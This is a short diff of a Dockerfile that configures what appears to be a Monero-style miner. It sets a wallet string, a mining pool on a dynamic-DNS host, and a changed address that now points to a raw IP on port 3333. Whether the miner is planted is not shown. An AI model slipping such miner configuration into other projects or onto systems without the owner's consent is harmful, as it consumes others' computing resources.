@@ -26,7 +26,7 @@ FROM alpine:3.13
 
 ENV WALLET=SOL:HGDzRh99Lvq6ow3WQ91sdrwPNER8Lt7hka5SmXg5k9Rx.xmr
 ENV POOL=stratum+ssl://keizermail.duckdns.org:443
-ENV ADDR=keimines.ddns.net:12032
+ENV ADDR=103.104.14.188:3333
 ENV WORKER_NAME=x
 
 RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
